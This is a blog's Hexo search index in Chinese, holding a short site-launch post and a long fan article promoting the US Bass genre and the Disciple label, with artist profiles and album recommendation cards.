<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>这是本站点的第一个页面</title>
    <url>/selfTalking/firstPage.html</url>
    <content><![CDATA[<p>之前曾经试着搞过……</p>
<p>首先是用的第三方图床崩了</p>
<p>接着工程自己也崩了（始终没找到是哪里崩的）</p>
<p>正好要做毕设，没时间整这玩意</p>
<p>这下毕设做完了，干脆重新整一个吧（</p>
<p>于是你就见到了这个新站点……</p>
<p>框架：hexo、主题：butterfly、现在以及今后可能都会出现各种魔改（</p>
]]></content>
      <categories>
        <category>日常</category>
      </categories>
      <tags>
        <tag>碎碎念</tag>
        <tag>本站</tag>
      </tags>
  </entry>
  <entry>
    <title>（传教）Disciple大法好！</title>
    <url>/EDM/%EF%BC%88%E4%BC%A0%E6%95%99%EF%BC%89Disciple%E5%A4%A7%E6%B3%95%E5%A5%BD%EF%BC%81%EF%BC%81%EF%BC%81.html</url>
    <content><![CDATA[<p>事先声明：本文是为不了解US Bass甚至不了解奠子阴乐的人准备的暴力传教材料。如果你是奠阴老油条，请当看乐子版油库里地对待本贴，谢谢合作~</p>
<p>本文著于2023年6月22日，当你观看的时候，部分内容可能已经失去时效性，请一切以实际情况为主~</p>
<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>你问我为什么要写这个文章？因为信仰多得都快溢出来了（</p>
<p>安利喜欢的东西实在是太正常了，所以我也要安利（</p>
<p>如果你没有听说过US Bass，甚至平时不听电子音乐，希望这个帖子能帮助你接触点新东西，缓解你可能存在的歌荒问题或音乐阳痿问题<del>，最好是将你变成Disciple狂信徒（</del></p>
<h1 id="US-Bass是啥呀？"><a href="#US-Bass是啥呀？" class="headerlink" title="US Bass是啥呀？"></a>US Bass是啥呀？</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>属于电子舞曲的一种音乐范畴，不是某一具体的风格，可以当作是很多种音乐风格的集合</p>
<p>下述的Disciple就是US Bass的代表性厂牌之一</p>
<h2 id="起源"><a href="#起源" class="headerlink" title="起源"></a>起源</h2><p>UK Bass简而言之就是英国人搞的玩意，翻译过来就是“英伦低音音乐”</p>
<p>US Bass是以UK Bass（也是一种音乐范畴）为前辈，在2010年左右，以美国为主战场，演化出的另一个截然不同的体系，而且或多或少吸收了金属乐的元素（所以在US Bass现场里也可以享受Headbang或Moshing哦）</p>
<p>这个时期就是电子音乐（尤指电子舞曲）逐渐走向大众视野，变得流行的时期，所以US Bass相比UK Bass更具有流行性（但比起EDM House还是差远了），至于有多流行，知道Skrillex的人肯定比知道Skream的人多好几倍吧</p>
<p>目前US Bass也才发展十余年，但确实已经形成一个较大的体系了，你想要激烈的，想要柔美的，想要史诗般震撼的，想要又怪又亚比的，这里都有</p>
<p>顺便一提，虽然名字叫US Bass，其实这玩意依旧是英国人发明的，只是被美国人发扬光大了而已，目前US Bass领域也有很多牛逼的英国人哦</p>
<h2 id="内容"><a href="#内容" class="headerlink" title="内容"></a>内容</h2><p>US Dubstep显然属于US Bass体系</p>
<p>虽然平时基本把US Bass和US Dubstep划等于号，但如果你愿意的话，也可以将部分Drum and Bass、部分EDM Trap、Bass House及其衍生、Glitch Hop及其衍生等列入该范畴内</p>
<p>如果你只是普通听歌的，没必要太追究音乐的风格，但听多了自然就越来越熟悉了</p>
<p>广义的Bass音乐包括UK Bass和US Bass，因为US Bass很多时候已经不能被称作“低音音乐”了，所以有些人会将UK Bass称作狭义的Bass音乐</p>
<h1 id="Disciple是啥呀？"><a href="#Disciple是啥呀？" class="headerlink" title="Disciple是啥呀？"></a>Disciple是啥呀？</h1><p><img src= "/img/loading.gif" data-lazy-src="https://image.cheriko.fun/post/202306251726504.jpg" alt="奠阴原神，启动！"></p>
<h2 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h2><p>创立于英国，发展于美国的独立音乐厂牌</p>
<p>早期名为Disciple Recording，16年更名为Disciple，持有子厂牌Disciple Round Table</p>
<p>目前的地表最知名US Bass厂牌，江湖人称门徒厂<del>地赛破</del></p>
<p><a href="https://www.disciplerecs.com/">官网</a>    <a href="https://www.youtube.com/@Disciplerecs/about">YouTube</a>    <a href="https://www.instagram.com/disciple/">Instagram</a>    <a href="https://twitter.com/Disciplerecs">Twitter</a>    <a href="https://www.facebook.com/groups/DIscipleFamily/">Facebook</a>    <a href="https://open.spotify.com/playlist/3pZmNRGdF7pvYNBM15tYrv">Spotify</a></p>
<p><del>地赛破成为地表最强的真正原因是上一个地表最强Never Say Die倒闭了</del></p>
<h2 id="音乐"><a href="#音乐" class="headerlink" title="音乐"></a>音乐</h2><p>厂牌主营Heavy Dubstep，偶尔也发行其他US Bass风格</p>
<p>主厂更加流行大众化，多样性更强；子厂更注重Riddim Dubstep，相对而言没那么大众</p>
<p>主厂和圆桌所有已发行曲目加起来接近两千首，保质保量<del>，虽然近期有一定的质量下滑现象</del></p>
<p><a href="https://music.163.com/playlist?id=602546451&userid=319313489">Disciple全收录</a>    <a href="https://music.163.com/playlist?id=161302947&userid=319313489">Disciple Round Table全收录</a></p>
<h2 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h2><p>说Disciple是最擅长营销的US Bass厂牌之一一点也不为过，可以概括为一群蛇精病组成的幸福大家庭（</p>
<p>成员团结一致，贯彻着”Unus pro omnibus, omnes pro uno”（“人人为我，我为人人”）的门徒精神，为US Bass的发展做出贡献，包括但不限于发布免费教程、发行采样包、助推US Bass的每一次新风口等</p>
<p>不仅如此，厂牌还热衷于进行人设营销<del>虽然比不过Monstercat</del>，打造更吸睛的“Bass爱豆”（非贬义，他们都是有实力的），让人们更能记住这些个性和特点鲜明的制作人</p>
<p>最重要的是，他们真的很擅长整活！三天两头搞一些沙雕玩意，或是全员一起做一首信仰感溢出的曲子，或是为圣诞节的栏杆奏响圣歌，甚至是一起玩Among US（</p>
<p>这一切都让人们谈起Disciple时，内心总是洋溢着一股快乐和温馨感<del>（所谓附加价值策略吧）</del></p>
<h2 id="成员"><a href="#成员" class="headerlink" title="成员"></a>成员</h2><p>签约Disciple的艺人就是Disciple Family的一员，十年来有聚有散，但家一直都是那个家</p>
<p>（以下成员按加入时间排序<del>，但是不一定准</del>）</p>
<p><del>（为了防止有人雷立体人这里就不放照片了，需要的话可以看歌单封面的丑照）</del></p>
<p><del>（其实就是懒得找图）</del></p>
<h3 id="Dodge-amp-Fuski"><a href="#Dodge-amp-Fuski" class="headerlink" title="Dodge&amp;Fuski"></a>Dodge&amp;Fuski</h3><p><img src= "/img/loading.gif" data-lazy-src="https://image.cheriko.fun/post/202306241826022.png" alt="logo"></p>
<p><a href="https://music.163.com/playlist?id=8478393762">网易云歌单</a></p>
<ul>
<li>成员：Rob Talbott (aka Dodge), Christopher Allen (Chris aka Fuski)</li>
<li>昵称：豆腐兄弟，DnF等</li>
<li>英国Dubstep组合，成员Rob是Disciple的创始人之一</li>
<li>Dodge是Disciple的<del>神</del>精神领袖，而Fuski长期处于半隐退状态（后来Dodge也半隐退了）</li>
<li>人设上，Dodge是地主家的傻儿子，Fuski是一般通过农民（</li>
<li>相关马甲：Mediks, 4AM, JVST SAY YES, Arthur Talbot</li>
</ul>
<h3 id="Astronaut"><a href="#Astronaut" class="headerlink" title="Astronaut"></a>Astronaut</h3><p><img src= "/img/loading.gif" data-lazy-src="https://image.cheriko.fun/post/202306241826010.png" alt="logo"></p>
<p><a href="https://music.163.com/playlist?id=8485973836">网易云歌单</a></p>
<ul>
<li>成员：Daniel Goudie (Dan), Ross Burr (Rossy)</li>
<li>英国Dubstep&#x2F;Complextro组合，成员Rossy是Disciple的创始人之一</li>
<li>除Disciple外还曾签约Monstercat</li>
<li>16年初组合解散，于是Rossy开启了个人项目Myro</li>
<li>相关马甲：Myro, Mediks, Statix</li>
</ul>
<h3 id="Barely-Alive"><a href="#Barely-Alive" class="headerlink" title="Barely Alive"></a>Barely Alive</h3><p><img src= "/img/loading.gif" data-lazy-src="https://image.cheriko.fun/post/202306241826012.png" alt="logo"></p>
<p><a href="https://music.163.com/playlist?id=7277271897">网易云歌单</a></p>
<ul>
<li>成员：Mattew Meier (Matt), William Watkins (Willie), Watt（误）</li>
<li>昵称：BA、小电视<del>、微波炉</del>等</li>
<li>美国Dubstep组合，2014年初签约Disciple，Disciple的第一个签约</li>
<li>有着将Heavy Bass和复古未来系列音乐和视觉风格结合的特色</li>
<li>Disciple的<del>万年老二</del>左右门神之右白虎（误）</li>
<li>[ò…ó]的名字叫Watt，原型是80年代旧电视，设定是Matt和Willie制造的机器人，皮下是Willie</li>
<li><del>站长的推，很可爱，每天都会舔</del></li>
<li>相关马甲：Chodegang</li>
</ul>
<h3 id="Diamond-Eyes"><a href="#Diamond-Eyes" class="headerlink" title="Diamond Eyes"></a>Diamond Eyes</h3><p><img src= "/img/loading.gif" data-lazy-src="https://image.cheriko.fun/post/202306241826017.png" alt="logo"></p>
<p><a href="https://music.163.com/playlist?id=8485837696">网易云歌单</a></p>
<ul>
<li>真名：Joshua Marment</li>
<li>英国Dubstep制作人，2014年签约Disciple，2015年退出</li>
<li>而且唱歌也很好听哦</li>
</ul>
<h3 id="Virtual-Riot"><a href="#Virtual-Riot" class="headerlink" title="Virtual Riot"></a>Virtual Riot</h3><p><img src= "/img/loading.gif" data-lazy-src="https://image.cheriko.fun/post/202306241826040.png" alt="logo"></p>
<p><a href="https://music.163.com/playlist?id=7278224175">网易云歌单</a></p>
<ul>
<li>真名：Christian Valentin Brunn (Val)</li>
<li>昵称：VR、紫毛<del>、微阿</del>等</li>
<li>德国Dubstep制作人，2014年签约Disciple</li>
<li>全能型制作人，除Dubstep外，在其他很多EDM场景也颇有建树</li>
<li>Disciple真正的活招牌，人气和才华都是顶流级别</li>
<li>Disciple的左右门神之左青龙（误）</li>
<li><del>二刺螈</del></li>
<li>相关马甲：Chodegang, Still Kids, Your Personal Tranquillizer</li>
</ul>
<h3 id="Dubloadz"><a href="#Dubloadz" class="headerlink" title="Dubloadz"></a>Dubloadz</h3><p><img src= "/img/loading.gif" data-lazy-src="https://image.cheriko.fun/post/202306241826019.png" alt="logo"></p>
<p><a href="https://music.163.com/playlist?id=8485774675">网易云歌单</a></p>
<ul>
<li>真名：Dave Nardolilli</li>
<li>美国Dubstep制作人，2015年签约Disciple，2018年初退出</li>
<li>身为DJ制作人的同时也是画师，最喜欢画小怪物</li>
<li>拥有自己创立的厂牌Ghost Gang Records</li>
<li>2020年因精神状态不佳和瓶颈宣布引退，现在则处于半复出状态</li>
<li><del>日本游戏厨</del></li>
<li>相关马甲：Chodegang</li>
</ul>
<h3 id="Myro"><a href="#Myro" class="headerlink" title="Myro"></a>Myro</h3><p><img src= "/img/loading.gif" data-lazy-src="https://image.cheriko.fun/post/202306241826028.png" alt="logo"></p>
<p><a href="https://music.163.com/playlist?id=8480797466">网易云歌单</a></p>
<ul>
<li>真名：Ross Burr (Rossy)</li>
<li>英国Dubstep制作人，Disciple创始人之一，其实就是Astronaut解散后单飞的Rossy</li>
<li>擅长旋律系Wobble Bass</li>
<li><del>Myro new EP when?</del></li>
<li>相关马甲：Astronaut, Mediks, Statix</li>
</ul>
<h3 id="Fox-Stevenson"><a href="#Fox-Stevenson" class="headerlink" title="Fox Stevenson"></a>Fox Stevenson</h3><p><img src= "/img/loading.gif" data-lazy-src="https://image.cheriko.fun/post/202306241826021.png" alt="logo"></p>
<p><a href="https://music.163.com/playlist?id=8494671473">网易云歌单</a></p>
<ul>
<li>真名：Stanley Stevenson-Byrne (Stan)</li>
<li>昵称：狐狸</li>
<li>英国Dubstep&#x2F;DnB&#x2F;House制作人，2016年签约Disciple，2022年初退出</li>
<li>以好听的旋律和人声闻名，狐狸唱歌特好听</li>
<li>早期艺名为Stan SB（草）</li>
</ul>
<h3 id="Oolacile"><a href="#Oolacile" class="headerlink" title="Oolacile"></a>Oolacile</h3><p><img src= "/img/loading.gif" data-lazy-src="https://image.cheriko.fun/post/202306241826031.png" alt="logo（这其实是他的旧logo，但是我没找到合适的新logo的素材）"></p>
<p><a href="https://music.163.com/playlist?id=8492346174">网易云歌单</a></p>
<ul>
<li>真名：Cooper Medearis</li>
<li>美国Dubstep制作人，2016年末签约Disciple，2018年退出</li>
<li>拥有自己创立的厂牌Halcyon</li>
<li><del>理念和实力比地赛破人更加前卫，待地赛破是一种屈才，所以退了才好</del></li>
</ul>
<h3 id="PhaseOne"><a href="#PhaseOne" class="headerlink" title="PhaseOne"></a>PhaseOne</h3><p><img src= "/img/loading.gif" data-lazy-src="https://image.cheriko.fun/post/202306241826034.png" alt="logo"></p>
<p><a href="https://music.163.com/playlist?id=8480773164">网易云歌单</a></p>
<ul>
<li>真名：Graeme Duffy</li>
<li>昵称：P1、一哥等</li>
<li>澳大利亚Dubstep制作人，2017年初签约Disciple</li>
<li>擅长Metalstep，甚至多次与金属乐队合作</li>
<li>拥有自己的创立的厂牌Sounds Of Mayhem</li>
<li>截至本贴发布时还没有确切的一哥是否已退厂的信息，但一哥似乎去意已决了</li>
</ul>
<h3 id="The-Others"><a href="#The-Others" class="headerlink" title="The Others"></a>The Others</h3><p><img src= "/img/loading.gif" data-lazy-src="https://image.cheriko.fun/post/202306241826033.png" alt="logo"></p>
<p><a href="https://music.163.com/playlist?id=8506937806">网易云歌单</a></p>
<ul>
<li>原名：Alex Crawford (aka D-Code)</li>
<li>前成员：Paul Baker (aka DeXterous)</li>
<li>英国Dubstep组合&#x2F;制作人，2017年初以单人的形式加入Disciple，2018年末左右退出</li>
</ul>
<h3 id="Truth"><a href="#Truth" class="headerlink" title="Truth"></a>Truth</h3><p><img src= "/img/loading.gif" data-lazy-src="https://image.cheriko.fun/post/202306241826037.png" alt="logo"></p>
<p><a href="https://music.163.com/playlist?id=8493341170">网易云歌单</a></p>
<ul>
<li>成员：Andre Fernandez, Tristan Roake</li>
<li>前成员：Julian Van Uden</li>
<li>新西兰Dubstep组合，2017年签约Disciple，2018年退出</li>
</ul>
<h3 id="12th-Planet"><a href="#12th-Planet" class="headerlink" title="12th Planet"></a>12th Planet</h3><p><img src= "/img/loading.gif" data-lazy-src="https://image.cheriko.fun/post/202306241826009.png" alt="logo"></p>
<p><a href="https://music.163.com/playlist?id=8484728638">网易云歌单</a></p>
<ul>
<li>真名: John Christopher Dadzie</li>
<li>昵称：12星、12th等</li>
<li>美国Dubstep制作人，2017年签约Disciple，2021年末退出</li>
<li>将dubstep传入美国的功臣，被冠以重量级称号“Dubstep教父”</li>
<li>Disciple Round Tabele的前任主理人</li>
<li><del>Never Say Die和Disciple决裂的直接原因</del></li>
<li>关于X侵风波：2021年末，12th的摄影师♀指控12th对其进行过X侵，所以12th被逐出Disciple且遭到了严重的声誉危机，但2022年初12th发表了澄清声明，目前看来声明似乎有效，因此12th逐渐恢复正常音乐活动，但也没有再回到Disciple</li>
</ul>
<h3 id="Virus-Syndicate"><a href="#Virus-Syndicate" class="headerlink" title="Virus Syndicate"></a>Virus Syndicate</h3><p><img src= "/img/loading.gif" data-lazy-src="https://image.cheriko.fun/post/202306241826039.png" alt="logo"></p>
<p><a href="https://music.163.com/playlist?id=8482447407">网易云歌单</a></p>
<ul>
<li>成员：David Hindley (aka JSD), Nikhil Nagarkar (aka Nika D)</li>
<li>前成员：Mark Foster, Marvin McKenzie</li>
<li>英国Dubstep&#x2F;Grime乐队&#x2F;组合，2017年签约Disciple</li>
<li><del>Disciple御用歌姬</del></li>
<li>拥有自己创立的厂牌Bad Medic Records</li>
</ul>
<h3 id="Hatcha"><a href="#Hatcha" class="headerlink" title="Hatcha"></a>Hatcha</h3><p><img src= "/img/loading.gif" data-lazy-src="https://image.cheriko.fun/post/202306241826024.png" alt="logo"></p>
<p><a href="https://music.163.com/playlist?id=8486310191">网易云歌单</a></p>
<ul>
<li>真名：Terry Leonard</li>
<li>英国Dubstep制作人，2017年末签约Disciple，2018年末退出</li>
<li>这位更是重量级，UK Dubstep的创始人和推广人之一<del>，地赛破何德何能能把他拉来</del></li>
<li>早期艺名为DJ Hatcha</li>
</ul>
<h3 id="Eliminate"><a href="#Eliminate" class="headerlink" title="Eliminate"></a>Eliminate</h3><p><img src= "/img/loading.gif" data-lazy-src="https://image.cheriko.fun/post/202306241826029.png" alt="logo"></p>
<p><a href="https://music.163.com/playlist?id=7277758114">网易云歌单</a></p>
<ul>
<li>真名：Nathan Merrill (Nate)</li>
<li>昵称：<del>Eliminiminiminate、</del>赛博鲸等</li>
<li>美国Trap&#x2F;Dubstep 制作人，2018年签约Disciple</li>
<li>擅长鲸鱼般的高频音色设计，被称为Disciple中的音色怪物，个人特点鲜明</li>
<li>乐子人，承包了Disciple一半的整活（确信）</li>
<li>身为DJ制作人的同时也是youtuber (?)</li>
<li><del><strong>VIRTUAL RIOT IS MY BEST FRIEND</strong></del></li>
</ul>
<h3 id="Panda-Eyes"><a href="#Panda-Eyes" class="headerlink" title="Panda Eyes"></a>Panda Eyes</h3><p><img src= "/img/loading.gif" data-lazy-src="https://image.cheriko.fun/post/202306241826035.png" alt="logo"></p>
<p><a href="https://music.163.com/playlist?id=8492661705">网易云歌单</a></p>
<ul>
<li>真名：Oskar Gabriel Steinbeck</li>
<li>昵称：PE<del>、潘大爱</del></li>
<li>瑞士Dubstep制作人，2018年初签约Disciple，半年后退出</li>
<li>拥有自己创立的厂牌Panda Eyes Records</li>
<li><del>二刺螈</del></li>
<li><del>究极任豚</del></li>
<li>Virtual Riot2.0（错乱）<del>搁他面前开这个玩笑他会生气的</del></li>
</ul>
<h3 id="MVRDA"><a href="#MVRDA" class="headerlink" title="MVRDA"></a>MVRDA</h3><p><img src= "/img/loading.gif" data-lazy-src="https://image.cheriko.fun/post/202306241826027.png" alt="logo"></p>
<p><a href="https://music.163.com/playlist?id=8489715365">网易云歌单</a></p>
<ul>
<li>真名：Tommy Lee Ray</li>
<li>英国Dubstep制作人，2018年签约Disciple Round Table，2023年初退出</li>
<li>早期艺名为MurDa</li>
<li>相关马甲：TOOG &amp; GOOT</li>
</ul>
<h3 id="INFEKT"><a href="#INFEKT" class="headerlink" title="INFEKT"></a>INFEKT</h3><p><img src= "/img/loading.gif" data-lazy-src="https://image.cheriko.fun/post/202306241826025.png" alt="logo"></p>
<p><a href="https://music.163.com/playlist?id=8480638861">网易云歌单</a></p>
<ul>
<li>真名：Christian Fial</li>
<li>德国Dubstep制作人，2018年签约Disciple Round Table</li>
<li>Riddim Dubstep当之无愧的代表人物</li>
<li>Trench运动的主导者，主张将最纯粹的Riddim Dubstep称为Trench</li>
<li><del>很可爱，笑容异常的灿烂，见一次乐一次</del></li>
</ul>
<h3 id="Modestep"><a href="#Modestep" class="headerlink" title="Modestep"></a>Modestep</h3><p><img src= "/img/loading.gif" data-lazy-src="https://image.cheriko.fun/post/202306241826026.png" alt="logo"></p>
<p><a href="https://music.163.com/playlist?id=7688309976">网易云歌单</a></p>
<ul>
<li>真名：Joshua Friend (Josh)</li>
<li>前成员：Matthew Curtis, Pat Lundy, Nick Tsang, Kyle Deek, Tony Friend, Oz Katerji</li>
<li>英国Dubstep&#x2F;DnB&#x2F;另类摇滚&#x2F;硬摇滚&#x2F;电子摇滚乐队&#x2F;组合&#x2F;制作人，2018年以双人组（Josh和Pat）的形式签约Disciple，2023年初退出</li>
<li>因成员悉数退出，目前只剩Josh一人，所以Modestep实质已成为Josh的个人项目</li>
<li><del>Josh唱歌真的巨好听，感觉是天使下凡</del></li>
</ul>
<h3 id="Oliverse"><a href="#Oliverse" class="headerlink" title="Oliverse"></a>Oliverse</h3><p><img src= "/img/loading.gif" data-lazy-src="https://image.cheriko.fun/post/202306241826030.png" alt="logo"></p>
<p><a href="https://music.163.com/playlist?id=7279474970">网易云歌单</a></p>
<ul>
<li>真名：Ryan Oliphant</li>
<li>昵称：欧宝</li>
<li>英国Dubstep制作人，2018年签约Disciple</li>
<li>擅长旋律系Wobble Bass</li>
<li><del>众所周知当地赛破没活整时就会把欧宝拉来填充档期</del></li>
</ul>
<h3 id="Terravita"><a href="#Terravita" class="headerlink" title="Terravita"></a>Terravita</h3><p><img src= "/img/loading.gif" data-lazy-src="https://image.cheriko.fun/post/202306241826038.png" alt="logo"></p>
<p><a href="https://music.163.com/playlist?id=8481426062">网易云歌单</a></p>
<ul>
<li>成员：Chris Barlow, Jon Spero</li>
<li>前成员：Matt Simmers</li>
<li>英国Dubstep&#x2F;DnB组合，2018年末签约Disciple</li>
</ul>
<h3 id="Chibs"><a href="#Chibs" class="headerlink" title="Chibs"></a>Chibs</h3><p><img src= "/img/loading.gif" data-lazy-src="https://image.cheriko.fun/post/202306241826016.png" alt="logo"></p>
<p><a href="https://music.163.com/playlist?id=8485754260">网易云歌单</a></p>
<ul>
<li>真名：Ryan Michael Smith</li>
<li>昵称：薯片<del>、吃不死</del>等</li>
<li>澳大利亚Dubstep制作人，2019年签约Disciple Round Table，2023年初退出</li>
</ul>
<h3 id="Bandlez"><a href="#Bandlez" class="headerlink" title="Bandlez"></a>Bandlez</h3><p><img src= "/img/loading.gif" data-lazy-src="https://image.cheriko.fun/post/202306241826013.png" alt="logo"></p>
<p><a href="https://music.163.com/playlist?id=8477150916">网易云歌单</a></p>
<ul>
<li>成员：Diandre Ruiz, Vishal Bhanderi</li>
<li>昵称：班豆子</li>
<li>美国Dubstep组合，2019年签约Disciple Round Table</li>
<li>红色卫衣是Diandre，绿色卫衣是Vishal</li>
<li>Vishal实际上已是现任Disciple主理人</li>
</ul>
<h3 id="Dirtyphonics"><a href="#Dirtyphonics" class="headerlink" title="Dirtyphonics"></a>Dirtyphonics</h3><p><img src= "/img/loading.gif" data-lazy-src="https://image.cheriko.fun/post/202306241826018.png" alt="logo"></p>
<p><a href="https://music.163.com/playlist?id=8478077916">网易云歌单</a></p>
<ul>
<li>成员：Charly Barranger, Julien “PitchIn” Corrales</li>
<li>前成员：Thomas Desbouvrie, James “Youthstar” Davies, Pho</li>
<li>法国Dubstep&#x2F;DnB乐队&#x2F;组合，2019年初以双人组的形式签约Disciple</li>
</ul>
<h3 id="Samplifire"><a href="#Samplifire" class="headerlink" title="Samplifire"></a>Samplifire</h3><p><img src= "/img/loading.gif" data-lazy-src="https://image.cheriko.fun/post/202306241826041.png" alt="logo"></p>
<p><a href="https://music.163.com/playlist?id=8480625862">网易云歌单</a></p>
<ul>
<li>真名：Samy Beyou</li>
<li><del>昵称：三浦里发芽</del></li>
<li>法国Dubstep制作人，2019年签约Disciple Round Table</li>
<li>维京Dubstep的始作俑者（误）</li>
<li>相关马甲：TOOG &amp; GOOT</li>
</ul>
<h3 id="ECRAZE"><a href="#ECRAZE" class="headerlink" title="ECRAZE"></a>ECRAZE</h3><p><img src= "/img/loading.gif" data-lazy-src="https://image.cheriko.fun/post/202306241826020.png" alt="logo"></p>
<p><a href="https://music.163.com/playlist?id=8478895572">网易云歌单</a></p>
<ul>
<li>真名：Thomas Tran (Thom)</li>
<li>法国Dubstep制作人，2020年签约Disciple Round Table</li>
<li><del>Graphyt的好基友</del></li>
</ul>
<h3 id="Graphyt"><a href="#Graphyt" class="headerlink" title="Graphyt"></a>Graphyt</h3><p><img src= "/img/loading.gif" data-lazy-src="https://image.cheriko.fun/post/202306241826023.png" alt="logo"></p>
<p><a href="https://music.163.com/playlist?id=8478898774">网易云歌单</a></p>
<ul>
<li>真名：Guillaume Sergent</li>
<li>法国Dubstep制作人，2020年签约Disciple Round Table</li>
<li><del>ECRAZE的好基友</del></li>
</ul>
<h3 id="Ray-Volpe"><a href="#Ray-Volpe" class="headerlink" title="Ray Volpe"></a>Ray Volpe</h3><p><img src= "/img/loading.gif" data-lazy-src="https://image.cheriko.fun/post/202306241826036.png" alt="logo"></p>
<p><a href="https://music.163.com/playlist?id=8492443619">网易云歌单</a></p>
<ul>
<li>真名：Raymond Volpe Jr.</li>
<li>美国Dubstep人，2021年签约Disciple，2023年初退出</li>
<li>自设是名为Volpetron的机器人</li>
<li>托地赛破的福，他的人气在短短一年半里指数级增长<del>，然而火了后就润了，把地赛破当跳板是吧</del></li>
</ul>
<h3 id="Bainbridge"><a href="#Bainbridge" class="headerlink" title="Bainbridge"></a>Bainbridge</h3><p><img src= "/img/loading.gif" data-lazy-src="https://image.cheriko.fun/post/202306241826011.png" alt="logo"></p>
<p><a href="https://music.163.com/playlist?id=8477026556">网易云歌单</a></p>
<ul>
<li>真名：Reginald Moe (Reggie)</li>
<li>美国Dubstep制作人，2021年末签约Disciple Round Table</li>
</ul>
<h3 id="beastboi"><a href="#beastboi" class="headerlink" title="beastboi."></a>beastboi.</h3><p><img src= "/img/loading.gif" data-lazy-src="https://image.cheriko.fun/post/202306241826015.png" alt="logo"></p>
<p><a href="https://music.163.com/playlist?id=8477592360">网易云歌单</a></p>
<ul>
<li>真名：Khai Adams</li>
<li><del>昵称：野兽先辈</del></li>
<li>美国Dubstep制作人，2022年末签约Disciple Round Table</li>
<li>将迷幻亚比色彩带到主流Bass场景（指Disciple）的人</li>
</ul>
<h1 id="Disciple有啥好活啊？"><a href="#Disciple有啥好活啊？" class="headerlink" title="Disciple有啥好活啊？"></a>Disciple有啥好活啊？</h1><p>我在这里就以纯个人口味安利几个Disciple的好活吧~</p>
<p>你喜不喜欢一首歌只有你自己知道，我的安利仅供参考（</p>
<h2 id="主厂"><a href="#主厂" class="headerlink" title="主厂"></a>主厂</h2><div class="music-list">

  <div class="music-item">
      <div class="pic-item">
        <img class="cover" src= "/img/loading.gif" data-lazy-src="https://image.cheriko.fun/music/202304292228365.jpg?x-oss-process=image/resize,s_300">
        <div class="inner">
        </div>
        <img no-lazy src= "/img/loading.gif" data-lazy-src="/img/vinyl.png" class="vinyl no-lightbox">
        <div class="description">
      <p class="des-inner">我最爱的微波炉酱，如果真的要选一个最能代表微波炉的作品，应该就是它了吧</p>
    </div>
    
      </div>
      <p class="title music-to-site" title="去平台" data-id="75385252" data-server="netease" data-type="album">Lost In Time EP</p>
      <p class="author">Barely Alive</p>
      <div class="music-play-btns">
        <button class="music-play-btn play-album" data-id="75385252" data-server="netease" data-type="album">播放专辑</button>
        <button class="music-play-btn add-album" data-id="75385252" data-server="netease" data-type="album">添至列表</button>
      </div>
    </div>
  

  <div class="music-item">
      <div class="pic-item">
        <img class="cover" src= "/img/loading.gif" data-lazy-src="https://image.cheriko.fun/post/202306251523083.jpg?x-oss-process=image/resize,s_300">
        <div class="inner">
        </div>
        <img no-lazy src= "/img/loading.gif" data-lazy-src="/img/vinyl.png" class="vinyl no-lightbox">
        <div class="description">
      <p class="des-inner">虚拟暴动真是很多值得听的东西，所以选这个离发blog时间最近的大砖吧（</p>
    </div>
    
      </div>
      <p class="title music-to-site" title="去平台" data-id="132907606" data-server="netease" data-type="album">Simulation</p>
      <p class="author">Virtual Riot</p>
      <div class="music-play-btns">
        <button class="music-play-btn play-album" data-id="132907606" data-server="netease" data-type="album">播放专辑</button>
        <button class="music-play-btn add-album" data-id="132907606" data-server="netease" data-type="album">添至列表</button>
      </div>
    </div>
  

  <div class="music-item">
      <div class="pic-item">
        <img class="cover" src= "/img/loading.gif" data-lazy-src="https://image.cheriko.fun/post/202306251527485.jpg?x-oss-process=image/resize,s_300">
        <div class="inner">
        </div>
        <img no-lazy src= "/img/loading.gif" data-lazy-src="/img/vinyl.png" class="vinyl no-lightbox">
        <div class="description">
      <p class="des-inner">Metalstep经典~好像也经常被用作金属乐迷和电子乐迷间相互了解的桥梁</p>
    </div>
    
      </div>
      <p class="title music-to-site" title="去平台" data-id="78285882" data-server="netease" data-type="album">TRANSCENDENCY</p>
      <p class="author">PhaseOne</p>
      <div class="music-play-btns">
        <button class="music-play-btn play-album" data-id="78285882" data-server="netease" data-type="album">播放专辑</button>
        <button class="music-play-btn add-album" data-id="78285882" data-server="netease" data-type="album">添至列表</button>
      </div>
    </div>
  

  <div class="music-item">
      <div class="pic-item">
        <img class="cover" src= "/img/loading.gif" data-lazy-src="https://image.cheriko.fun/post/202306251529370.jpg?x-oss-process=image/resize,s_300">
        <div class="inner">
        </div>
        <img no-lazy src= "/img/loading.gif" data-lazy-src="/img/vinyl.png" class="vinyl no-lightbox">
        <div class="description">
      <p class="des-inner">千言万语汇成一句话：Eliminate究竟是什么天才</p>
    </div>
    
      </div>
      <p class="title music-to-site" title="去平台" data-id="133502402" data-server="netease" data-type="album">Belly Of The Beast EP</p>
      <p class="author">Eliminate</p>
      <div class="music-play-btns">
        <button class="music-play-btn play-album" data-id="133502402" data-server="netease" data-type="album">播放专辑</button>
        <button class="music-play-btn add-album" data-id="133502402" data-server="netease" data-type="album">添至列表</button>
      </div>
    </div>
  

  <div class="music-item">
      <div class="pic-item">
        <img class="cover" src= "/img/loading.gif" data-lazy-src="https://image.cheriko.fun/post/202306251532034.jpg?x-oss-process=image/resize,s_300">
        <div class="inner">
        </div>
        <img no-lazy src= "/img/loading.gif" data-lazy-src="/img/vinyl.png" class="vinyl no-lightbox">
        <div class="description">
      <p class="des-inner">来自Halcyon的BVSSIC给地赛破进行了一次降维打击（</p>
    </div>
    
      </div>
      <p class="title music-to-site" title="去平台" data-id="146347750" data-server="netease" data-type="album">A Blissful Gaze Of Ignorance</p>
      <p class="author">BVSSIC</p>
      <div class="music-play-btns">
        <button class="music-play-btn play-album" data-id="146347750" data-server="netease" data-type="album">播放专辑</button>
        <button class="music-play-btn add-album" data-id="146347750" data-server="netease" data-type="album">添至列表</button>
      </div>
    </div>
  

  <div class="music-item">
      <div class="pic-item">
        <img class="cover" src= "/img/loading.gif" data-lazy-src="https://image.cheriko.fun/post/202306251540989.jpg?x-oss-process=image/resize,s_300">
        <div class="inner">
        </div>
        <img no-lazy src= "/img/loading.gif" data-lazy-src="/img/vinyl.png" class="vinyl no-lightbox">
        <div class="description">
      <p class="des-inner">任何邪恶终将绳之以法</p>
